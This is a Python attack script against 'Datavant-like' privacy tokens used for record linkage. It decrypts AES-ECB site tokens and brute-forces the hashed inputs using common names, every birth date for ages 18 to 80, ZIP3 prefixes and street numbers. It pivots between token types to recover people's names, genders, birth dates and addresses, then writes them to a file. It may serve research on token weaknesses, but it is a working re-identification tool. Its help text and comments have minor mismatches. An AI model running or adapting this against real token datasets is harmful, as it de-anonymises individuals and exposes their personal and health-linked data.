#!/usr/bin/env python3
import argparse
import base64
import csv
import hashlib
import hmac
import re
import time
from collections import Counter, defaultdict
from datetime import datetime, date
from typing import Dict, Any, Iterable, Tuple, Set, Optional
from jellyfish import soundex
from Crypto.Cipher import AES
import pandas as pd
from faker import Faker
import itertools

# Calculate all possible birthdays for ages 18 to 80
today = date.today()
min_year = today.year - 80
max_year = today.year - 18

# =============================
# Normalization / helpers
# =============================
def norm(s: Any) -> str:
    return "".join(ch for ch in str(s or "").strip().lower() if ch.isalnum())

def norm_gender(g: Any) -> str:
    g = str(g or "").strip().lower()
    if g in ("m", "male"): return "m"
    if g in ("f", "female"): return "f"
    return "u"

def norm_dob(s: Any) -> str:
    s = str(s or "").strip()
    fmts = ("%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y", "%Y/%m/%d", "%Y%m%d")
    for f in fmts:
        try:
            return datetime.strptime(s, f).strftime("%Y%m%d")
        except ValueError:
            pass
    if len(s) == 8 and s.isdigit():
        return s
    return ""

def first_initial(fn: str) -> str:
    n = norm(fn)
    return n[0] if n else ""

def first3(fn: str) -> str:
    n = norm(fn)
    return n[:3] if n else ""

def split_address(address):
    # Try German format: street name first, then number
    match_german = re.match(r"^([\w\s\-\.]+)\s+(\d+)[a-zA-Z]?", str(address))
    if match_german:
        return match_german.group(1).strip(), match_german.group(2).strip(), 'german'
    # Try American format: number first, then street name
    match_american = re.match(r"^(\d+)\s+([\w\s\-\.]+)", str(address))
    if match_american:
        return match_american.group(2).strip(), match_american.group(1).strip(), 'american'
    # Only street name, no number
    match_street_only = re.match(r"^([\w\s\-\.]+)$", str(address).strip())
    if match_street_only:
        return match_street_only.group(1).strip(), None, 'street_only'
    # If none matches, return whole address and None
    return str(address).strip(), None, 'unknown'

def time_attack(func, *args, label=None):
    start = time.time()
    result = func(*args)
    end = time.time()
    elapsed = end - start
    if label:
        print(f"[TIMER] {label}: {elapsed:.2f} seconds")
    return result, elapsed

# =============================
# Master token functions
# =============================
def master_sha256(token_input: str) -> bytes:
    return hashlib.sha256(token_input.encode("utf-8")).digest()  # 32 bytes

def master_hmac(master_salt: bytes, token_input: str) -> bytes:
    return hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256).digest()  # 32 bytes

def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
    """Accept hex or utf-8; optionally enforce expected length."""
    try:
        b = bytes.fromhex(s)
    except ValueError:
        b = s.encode("utf-8")
    if expect_len is not None and len(b) != expect_len:
        raise ValueError(f"Expected {expect_len} bytes, got {len(b)}")
    return b

# =============================
# Site encryption (AES-ECB)
# =============================
def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
    """Decrypt base64-encoded site token to raw 32-byte master token."""
    ct = base64.b64decode(token_b64)
    if len(ct) % 16 != 0:
        raise ValueError("Ciphertext is not a multiple of AES block size.")
    cipher = AES.new(site_key_32, AES.MODE_ECB)  # AES-256 (32-byte key)
    pt = cipher.decrypt(ct)
    # Expect SHA-256 output length
    if len(pt) != 32:
        # Some pipelines might pack more; keep it but warn upstream if needed
        pass
    return pt

# =============================
# Token input builders
# =============================
def mk_T4(ln: str, fn: str, g: str, dob: str) -> str:
    if not (ln and fn and g and dob): return ""
    return f"{norm(ln)}|{norm(fn)}|{norm_gender(g)}|{dob}"

def mk_T3(ln: str, fn: str, dob: str, zip3: str) -> str:
    if not (ln and fn and dob and zip3): return ""
    return f"{norm(ln)}|{fn}|{dob}|{zip3}"

def mk_T7(ln: str, fi3: str, g: str, dob: str) -> str:
    if not (ln and fi3 and g and dob): return ""
    return f"{norm(ln)}|{fi3}|{norm_gender(g)}|{dob}"

def mk_T9(fn: str, address: str) -> str:
    if not (fn and address): return ""
    return f"{norm(fn)}|{norm(address)}"

# =============================
# Load and decrypt site tokens
# =============================
def load_site_tokens(path: str, cols: Iterable[str]) -> Dict[str, list]:
    with open(path, newline="", encoding="utf-8") as f:
        r = csv.DictReader(f)
        rows = list(r)
    return {"_RAW": rows}

def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> Dict[str, Set[bytes]]:
    out: Dict[str, Set[bytes]] = {c: set() for c in colnames}
    successes = 0
    failures = 0
    for row in rows:
        for c in colnames:
            val = (row.get(c) or "").strip()
            if not val:
                continue
            try:
                mt = aes256_ecb_decrypt_b64(site_key_32, val)
                out[c].add(mt)
                successes += 1
            except Exception:
                failures += 1
                # keep going
    for c in colnames:
        print(f"[decrypt] {c}: unique master tokens={len(out[c])} (sample successes={successes}, failures={failures})")
    return out

# =============================
# Dictionaries
# =============================
"""with open("nachnamen.txt", "r", encoding="utf-8") as f:
    TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]

with open("vornamen.txt", "r", encoding="utf-8") as f:
    TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]

with open("strassennamen.txt", "r", encoding="utf-8") as f:
    TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]

GENDERS = ["m","f","u"]"""

# Generate 200 birthdays
"""fake = Faker()
TOP_DOB = [fake.date_of_birth(minimum_age=18, maximum_age=90).strftime('%Y%m%d') for _ in range(200)]"""

# =============================
# Similiar DB
# =============================

#df_distribution = pd.read_csv(r"ohio_cleaned.csv")
df_distribution = pd.read_csv(r"known_data_clean.csv")

TOP_FIRST = df_distribution["first_name"].value_counts().head(500).index.tolist()
TOP_LAST = df_distribution["last_name"].value_counts().head(500).index.tolist()
# TOP_DOB = df_distribution["dob"].value_counts().head(500).index.tolist()
# TOP_YOB = df_distribution["year_of_birth"].value_counts().head(500).index.tolist()
# TOP_ZIP = df_distribution["zip"].value_counts().head(500).index.tolist()
TOP_ADDRESS = df_distribution["address"].value_counts().head(500).index.tolist()
GENDERS = ["m","f","u"]

# =============================
# Attack core
# =============================
def attack_entropy_first_T7(master_func, master_tokens: Set[bytes]) -> Dict[bytes, Tuple[str,str,str,str]]:
    """Dictionary attack against T7: ln|fi3|g|dob. Return {master_token: (ln, fi3, g, dob)}."""
    hits = {}
    for ln in TOP_LAST:
        # for fi3 in ("".join(comb) for comb in itertools.product("abcdefghijklmnopqrstuvwxyz", repeat=3)):
        for fi3 in (first3(fn) for fn in TOP_FIRST):     
            for g in GENDERS:
                """for dob in TOP_DOB:
                    inp = f"{norm(ln)}|{fi3}|{g}|{dob}"
                    if not inp: continue
                    mt = master_func(inp)
                    if mt in master_tokens:
                        hits[mt] = (norm(ln), fi3, g, dob)"""
                for year in range(min_year, max_year + 1):
                    for month in range(1, 13):
                        if month in [1, 3, 5, 7, 8, 10, 12]:
                            max_day = 31
                        elif month in [4, 6, 9, 11]:
                            max_day = 30
                        elif month == 2:
                            if (year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)):
                                max_day = 29
                            else:
                                max_day = 28
                        else:
                            max_day = 31
                        for day in range(1, max_day + 1):
                            dob_obj = date(year, month, day)
                            dob = dob_obj.strftime('%Y%m%d')
                            inp = f"{norm(ln)}|{fi3}|{g}|{dob}"
                            if not inp:
                                continue
                            mt = master_func(inp)
                            if mt in master_tokens:
                                hits[mt] = (norm(ln), fi3, g, dob)
    return hits

def pivot_from_T7_to_T4(master_func, T4_master_tokens: Set[bytes], t7_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str,str,str]]:
    """
    Use knowledge from T7 (ln|fi3|g|dob) to brute-force T4 (ln|fn|g|dob).
    """
    ln, fi3, g, dob = t7_hit
    out = {}
    for fn in TOP_FIRST:
        if not fn or norm(fn)[0:3] != fi3: # Test on all names?
            continue
        t4_inp = mk_T4(ln, fn, g, dob)
        if not t4_inp:
            continue
        mt = master_func(t4_inp)
        if mt in T4_master_tokens:
            out[mt] = (ln, norm(fn), g, dob)
    return out

def pivot_from_T4_to_T3(master_func, T3_master_tokens: Set[bytes], t4_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str,str,str]]:
    """
    Use knowledge from T4 (ln|fn|g|dob) to brute-force T3 (ln|fn|dob|zip3).
    """
    ln, fn, g, dob = t4_hit
    out = {}
    for zip3 in (f"{i:03}" for i in range(1000)):  # Iterate from 000 to 999
        t3_inp = f"{ln}|{norm(fn)}|{dob}|{zip3}"
        if not t3_inp:
            continue
        mt = master_func(t3_inp)
        if mt in T3_master_tokens:
            out[mt] = (ln, norm(fn), dob, zip3)
    return out

def pivot_from_T4_to_T9(master_func, T9_master_tokens: Set[bytes], t4_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str]]:
    """
    Use knowledge from T4 (ln|fn|g|dob) to brute-force T9 (fn|addr).
    """
    ln, fn, g, dob = t4_hit
    out = {}
    for address in TOP_ADDRESS:
        """t9_inp = f"{ln}|{address}"
        if not t9_inp:
            continue
        mt = master_func(t9_inp)
        if mt in T9_master_tokens:
            out[mt] = (ln, address)"""
        street, number, addr_type = split_address(address)
        if addr_type == 'german':
            # German: iterate numbers
            for num in range(1, 501):
                address_try = f"{street} {num}"
                t9_inp = f"{fn}|{address_try}"
                if not t9_inp:
                    continue
                mt = master_func(t9_inp)
                if mt in T9_master_tokens:
                    out[mt] = (fn, address_try)
        elif addr_type == 'american':
            # American: iterate numbers
            for num in range(1, 501):
                address_try = f"{num} {street}"
                t9_inp = f"{fn}|{address_try}"
                if not t9_inp:
                    continue
                mt = master_func(t9_inp)
                if mt in T9_master_tokens:
                    out[mt] = (fn, address_try)
        elif addr_type == 'street_only':
            # Street name only: iterate numbers
            for num in range(1, 501):
                address_try = f"{street} {num}"
                t9_inp = f"{fn}|{address_try}"
                if not t9_inp:
                    continue
                mt = master_func(t9_inp)
                if mt in T9_master_tokens:
                    out[mt] = (fn, address_try)
        else:
            # Unknown: use whole address without number iteration
            address_try = str(address).strip()
            t9_inp = f"{fn}|{address_try}"
            if not t9_inp:
                continue
            mt = master_func(t9_inp)
            if mt in T9_master_tokens:
                out[mt] = (fn, address_try)
    return out

# =============================
# Orchestrator
# =============================
def run_attack(args):
    # Master function
    if args.master_salt:
        ms = parse_bytes(args.master_salt)  # any length ok for HMAC key
        master_func = lambda s: master_hmac(ms, s)
        print("[*] Using HMAC-SHA256(master_salt, token_input).")
    else:
        master_func = lambda s: master_sha256(s)
        print("[*] Using SHA-256(token_input) (no master salt).")

    # Site key: AES-256 requires 32 bytes
    site_key = parse_bytes(args.site_key, expect_len=32)
    print(f"[*] Using AES-256-ECB for site token decryption (key length={len(site_key)}).")

    cols = [c.strip() for c in args.columns.split(",")]
    # Load & decrypt
    raw = load_site_tokens(args.infile, cols)
    rows = raw["_RAW"]
    dec = decrypt_columns(rows, site_key, cols)

    # If everything is empty, bail early with a hint
    if all(len(dec[c]) == 0 for c in cols):
        print("[!] No master tokens decrypted. Check: correct AES mode (ECB), key (32 bytes), base64 format, and that tokens are actually encrypted site tokens.")
        return

    # Phase 1: attack lowest-entropy tokens first (T1, T2)
    t7_hits = {}
    t7_time = None
    if "T7" in dec:
        print("[*] Attacking T7 (ln|fi3|g|dob)...")
        t7_hits, t7_time = time_attack(attack_entropy_first_T7, master_func, dec["T7"], label="T7")
        print(f"    -> Found {len(t7_hits)} T7 preimages")

    # Phase 2: pivot into T4 using knowledge from T7
    t4_pivot_hits = {}
    t4_time = None
    if "T4" in dec and t7_hits:
        print("[*] Pivoting to T4 (ln|fn|g|dob) using T7...")
        start = time.time()
        for mt7, (ln, fi3, g, dob) in t7_hits.items():
            out = pivot_from_T7_to_T4(master_func, dec["T4"], (ln, fi3, g, dob))
            t4_pivot_hits.update(out)
        t4_time = time.time() - start
        print(f"    -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
        print(f"[TIMER] T4: {t4_time:.2f} seconds")

    # Phase 3: pivot into t3 using knowledge from t4
    t3_pivot_hits = {}
    t3_time = None
    if "T3" in dec and t4_pivot_hits:
        print("[*] Pivoting to T3 (ln|fi|g|dob|zip3) using T4...")
        start = time.time()
        for mt4, (ln, fn, g, dob) in t4_pivot_hits.items():
            out = pivot_from_T4_to_T3(master_func, dec["T3"], (ln, fn, g, dob))
            t3_pivot_hits.update(out)
        t3_time = time.time() - start
        print(f"    -> Resolved {len(t3_pivot_hits)} T3 preimages via pivot")
        print(f"[TIMER] T3: {t3_time:.2f} seconds")

    # Phase 4: pivot into t9 using knowledge from t4
    t9_pivot_hits = {}
    t9_time = None
    if "T9" in dec and t4_pivot_hits:
        print("[*] Pivoting to T9 (ln|fi|g|dob|addr) using T4...")
        start = time.time()
        for mt4, (ln, fn, g, dob) in t4_pivot_hits.items():
            out = pivot_from_T4_to_T9(master_func, dec["T9"], (ln, fn, g, dob))
            t9_pivot_hits.update(out)
        t9_time = time.time() - start
        print(f"[TIMER] T9: {t9_time:.2f} seconds")

    # Report
    """print("\n=== RESULTS ===")
    if t7_hits:
        print(f"[T7] {len(t7_hits)} master tokens cracked")
        for mt, tpl in list(t7_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi3={tpl[1]} g={tpl[2]} dob={tpl[3]}")
    if t4_pivot_hits:
        print(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)")
        for mt, tpl in list(t4_pivot_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fn={tpl[1]} g={tpl[2]} dob={tpl[3]}")
    if t3_pivot_hits:
        print(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)")
        for mt, tpl in list(t3_pivot_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} dob={tpl[2]} zip3={tpl[3]}")
    if t9_pivot_hits:
        print(f"[T9] {len(t9_pivot_hits)} master tokens cracked (pivot)")
        for mt, tpl in list(t9_pivot_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} address={tpl[1]}")"""

    # Save results to a text file
    with open(args.outfile, "w", encoding="utf-8") as result_file:
        if t7_hits:
            result_file.write(f"[T7] {len(t7_hits)} master tokens cracked\n")
            result_file.write(f"[TIMER] T7: {t7_time:.2f} seconds\n")
            for mt, tpl in t7_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi3={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
        if t4_pivot_hits:
            result_file.write(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)\n")
            result_file.write(f"[TIMER] T4: {t4_time:.2f} seconds\n")
            for mt, tpl in t4_pivot_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fn={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
        if t3_pivot_hits:
            result_file.write(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)\n")
            result_file.write(f"[TIMER] T3: {t3_time:.2f} seconds\n")
            for mt, tpl in t3_pivot_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} dob={tpl[2]} zip3={tpl[3]}\n")
        if t9_pivot_hits:
            result_file.write(f"[T9] {len(t9_pivot_hits)} master tokens cracked (pivot)\n")
            result_file.write(f"[TIMER] T9: {t9_time:.2f} seconds\n")
            for mt, tpl in t9_pivot_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} address={tpl[1]}\n")

def main():
    ap = argparse.ArgumentParser(description="Attack Datavant-like tokens: decrypt site tokens, crack low-entropy keys, pivot to higher-entropy.")
    ap.add_argument("--in", dest="infile", required=True, help="CSV with token columns (e.g., T1,T2,T4)")
    ap.add_argument("--out", dest="outfile", required=True, help="Output file for results")
    ap.add_argument("--columns", required=True, help="Comma-separated token column names to use (e.g., T1,T2,T4)")
    ap.add_argument("--site-key", required=True, help="AES-128 key (hex or utf-8) for site token decryption")
    ap.add_argument("--master-salt", default="", help="(Optional) master salt (hex or utf-8); if empty uses SHA-256(no salt)")
    args = ap.parse_args()
    run_attack(args)

if __name__ == "__main__":
    main()
